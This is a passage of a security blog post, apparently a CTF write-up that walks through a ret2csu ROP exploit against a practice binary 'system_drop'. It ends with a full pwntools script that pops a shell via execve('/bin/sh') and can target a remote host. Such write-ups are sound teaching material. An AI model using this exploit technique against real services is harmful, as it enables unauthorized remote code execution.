+In [<span style="color:#ae81ff">3</span>]: hex( context<span style="color:#f92672">.</span>binary<span style="color:#f92672">.</span>bss() )
+Out[<span style="color:#ae81ff">3</span>]: <span style="color:#e6db74">&#39;0x601038&#39;</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -D ./system_drop | grep -A <span style="color:#ae81ff">3</span> bss
+
+Disassembly of section .bss:
+<span style="color:#ae81ff">0000000000601038</span> &lt;completed.7698&gt;:
+</code></pre></div><h3 id="kick-off-a-new-read-to-fill-bss">Kick off a new <code>read</code> to fill <code>.bss</code></h3>
+<p>When we take control of the program, we will have just completed a <code>read</code> where the arguments
+were <code>read(1, $dest, 0x100)</code>. The 1st and 3rd arguments work great for us, so we&rsquo;ll
+only need to find a <code>pop rsi</code> gadget in order to set the 2nd argument to before jumping to read
+again.</p>
+<pre><code>
+``` bash
+pwndbg&gt; ropper --  --search 'pop rsi'
+
+[INFO] File: system_drop
+0x00000000004005d1: pop rsi; pop r15; ret;
+</code></pre><p>Great. We can also dynamically fetch this in pwntools. I try to be kind to my future self when
+writing these exploits and avoid using &ldquo;magic numbers&rdquo;. In a year when I look back, I won&rsquo;t
+remember where <code>0x4005d1</code> came from.</p>
+<p>In any case, we can start building our payload.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
+pop_rsi_r15_ret <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;pop rsi; pop r15; ret&#39;</span>)))
+ptr_bin_sh <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>bss()
+ptr_syscall <span style="color:#f92672">=</span> ptr_bin_sh <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>limit
+payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15_ret)     <span style="color:#75715e"># prepare additional `read`</span>
+payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># rsi - read dest</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadc0de</span>)          <span style="color:#75715e"># r15 - junk</span>
+<span style="color:#75715e"># ret</span>
+payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read)          <span style="color:#75715e"># read in bin/sh to .bss</span>
+<span style="color:#75715e"># ret</span>
+</code></pre></div><h3 id="__libc_csu_init"><code>__libc_csu_init</code></h3>
+<p>When sending the previous code, the program will receive more input, which will contain the string
+<code>/bin/sh\x00</code> and store it at <code>ptr_bin_sh</code>. We now have a known address for the location of the
+first argument to <code>execve</code>.</p>
+<p>Let&rsquo;s build the <code>csu</code> portion of the payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">+=</span> p64(csu_one)             <span style="color:#75715e"># kick off register-setup with ret2csu</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbx</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbp</span>
+payload <span style="color:#f92672">+=</span> p64(ptr_syscall)         <span style="color:#75715e"># pop r12 -(stage 2)-&gt; call [r12+rbx*8]</span>
+payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># pop r13 -(stage 2)-&gt; rdi</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r14 -(stage 2)-&gt; rsi</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r15 -(stage 2)-&gt; rdx</span>
+<span style="color:#75715e"># ret</span>
+payload <span style="color:#f92672">+=</span> p64(csu_two)             <span style="color:#75715e"># stage 2 finishes -&gt; register setup</span>
+io<span style="color:#f92672">.</span>sendling(payload)
+</code></pre></div><p>We&rsquo;ll use the same strategy for creating <code>ptr_syscall</code> that we did for <code>ptr_bin_sh</code>. We&rsquo;ll pass it
+in later, during the first read.</p>
+<p>At this point, we could send the payload. This will trigger a <code>read</code>, we can pass in our second
+stage and populate the arguments we&rsquo;d need for execution during the second half of the exploit.</p>
+<p>The secondary payload contains the 8-byte string for <code>&quot;/bin/sh\x00&quot;</code> followed by the syscall
+address. We&rsquo;ll tack on a padding of null bytes until we reach a length of 59. This is because we&rsquo;ll
+be jumping to <code>syscall</code> and we need <code>rax</code> to equal 59 when we do. The return value of <code>read</code> is the
+length of the payload, which we control, and is stored at <code>rax</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">syscall <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;syscall&#39;</span>)))
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+payload <span style="color:#f92672">+=</span> p64(syscall)
+payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(c<span style="color:#f92672">.</span>SYS_execve, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># c is pwnlib.constants</span>
+
+io<span style="color:#f92672">.</span>send(payload)
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Let&rsquo;s put it all together</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> context, gdb, log, args, remote, process, p64, asm, constants <span style="color:#66d9ef">as</span> c
+<span style="color:#f92672">import</span> sys
+
+usage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    sploit.py &lt;BIN&gt; [REMOTE=x.x.x.x:yy] [GDB,DEBUG]
+</span><span style="color:#e6db74">    GDB     Enables use of GDB during exploit development. Require tmux
+</span><span style="color:#e6db74">    DEBUG   Enables debug logging in pwntool
+</span><span style="color:#e6db74">    REMOTE= Set the host and port to which the exploit will be sent
+</span><span style="color:#e6db74">            GDB cannot be used with this mode
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+BIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./system_drop&#34;</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>(gdbrc):
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">and</span> BIN <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
+        log<span style="color:#f92672">.</span>warn(usage)
+        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+    binary <span style="color:#f92672">=</span> BIN <span style="color:#f92672">or</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+    context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary
+    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+        HOST, PORT <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>REMOTE<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">return</span> remote(HOST, PORT)
+    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDB:
+        <span style="color:#75715e"># context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;, &#34;-p&#34;, &#34;75&#34;]</span>
+        context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;neww&#34;</span>]
+        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(binary, gdbrc)
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> process(binary)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(io):
+    <span style="color:#75715e"># import ipdb;ipdb.set_trace(context=5)</span>
+    limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
+    e <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary
+
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    0x004005ca      pop rbx
+</span><span style="color:#e6db74">    0x004005cb      pop rbp
+</span><span style="color:#e6db74">    0x004005cc      pop r12
+</span><span style="color:#e6db74">    0x004005ce      pop r13
+</span><span style="color:#e6db74">    0x004005d0      pop r14
+</span><span style="color:#e6db74">    0x004005d2      pop r15
+</span><span style="color:#e6db74">    0x004005d4      ret
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    csu_one <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005ca</span>
+
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    0x004005b0      mov rdx, r15       ; char **ubp_av
+</span><span style="color:#e6db74">    0x004005b3      mov rsi, r14       ; int argc
+</span><span style="color:#e6db74">    0x004005b6      mov edi, r13d      ; func main
+</span><span style="color:#e6db74">    0x004005b9      call qword [r12 + rbx*8]
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    csu_two <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005b0</span>
+
+    pop_rsi_r15_ret <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;pop rsi; pop r15; ret&#39;</span>)))
+    ptr_bin_sh <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>bss()
+    ptr_syscall <span style="color:#f92672">=</span> ptr_bin_sh <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>limit
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15_ret)     <span style="color:#75715e"># prepare additional `read`</span>
+    payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># rsi - read dest</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadc0de</span>)          <span style="color:#75715e"># r15 - junk</span>
+    <span style="color:#75715e"># ret</span>
+    payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read)          <span style="color:#75715e"># read in bin/sh and syscall to .bss</span>
+    <span style="color:#75715e"># ret</span>
+    payload <span style="color:#f92672">+=</span> p64(csu_one)             <span style="color:#75715e"># kick off register setup with ret2csu</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbx</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbp</span>
+    payload <span style="color:#f92672">+=</span> p64(ptr_syscall)         <span style="color:#75715e"># pop r12 -&gt; call [r12+rbx*8]</span>
+    payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># pop r13 -&gt; rdi</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r14 -&gt; rsi</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r15 -&gt; rdx</span>
+    <span style="color:#75715e"># ret</span>
+    payload <span style="color:#f92672">+=</span> p64(csu_two)             <span style="color:#75715e"># stage 2 finishes -&gt; register setup</span>
+    io<span style="color:#f92672">.</span>sendline(payload)
+
+    syscall <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;syscall&#39;</span>)))
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p64(syscall)
+    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(c<span style="color:#f92672">.</span>SYS_execve, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+    io<span style="color:#f92672">.</span>send(payload)
+    io<span style="color:#f92672">.</span>interactive()
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    gdbrc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    # b read
+</span><span style="color:#e6db74">    # b *__libc_csu_init+73
+</span><span style="color:#e6db74">    # c
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    io <span style="color:#f92672">=</span> init(gdbrc)
+    main(io)
+</code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1949 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-04-24 11:42 -0400</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://sec.alexflor.es/posts/2020/05/password-dump-database-part-2/">
+                                <span class="button__text">Password Dump Database - Part 2</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+                <span><a href="https://sec.alexflor.es">[audible]blink</a></span>
+            
+            <span></span>
+            <span> <a href="https://sec.alexflor.es/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+
+  <div style="margin-top: 1em;" class="container has-text-centered">
+            <img src="https://www.hackthebox.eu/badge/image/1496" alt="Hack The Box">
+  </div>
+
+
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.02362af9051064dfafca852f5fb28cb551f82de3983c495e3bc721523da50db0be1185ee1837a4ea86997b30026175b799489571cbc9a14aa22a7f5b312830ee.js" integrity="sha512-AjYq&#43;QUQZN&#43;vyoUvX7KMtVH4LeOYPEleO8chUj2lDbC&#43;EYXuGDek6oaZezACYXW3mUiVccvJoUqiKn9bMSgw7g=="></script>
+
+
+
+    </body>
+</html>
